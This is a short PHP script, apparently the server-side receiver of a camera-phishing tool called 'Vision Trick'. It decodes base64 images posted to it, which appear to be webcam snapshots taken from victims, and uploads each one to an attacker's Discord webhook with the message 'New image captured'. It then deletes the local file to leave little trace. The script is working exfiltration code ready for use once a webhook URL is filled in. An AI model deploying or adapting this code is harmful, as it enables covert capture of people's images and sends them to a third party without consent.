<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");

    // Decode the image data
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    // Save the image locally
    $filename = 'vision_trick_' . $date . '.png';
    $fp = fopen($filename, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);

    // Send the image to Discord
    $discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your Discord webhook URL
    $file = curl_file_create($filename, 'image/png', $filename);

    $payload = [
        'content' => 'New image captured by Vision Trick!',
        'file' => $file,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $discordWebhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Log Discord response
    error_log("Discord Response: " . $response . "\r\n", 3, "Log.log");

    // Clean up the saved image
    unlink($filename);
}

exit();
?>
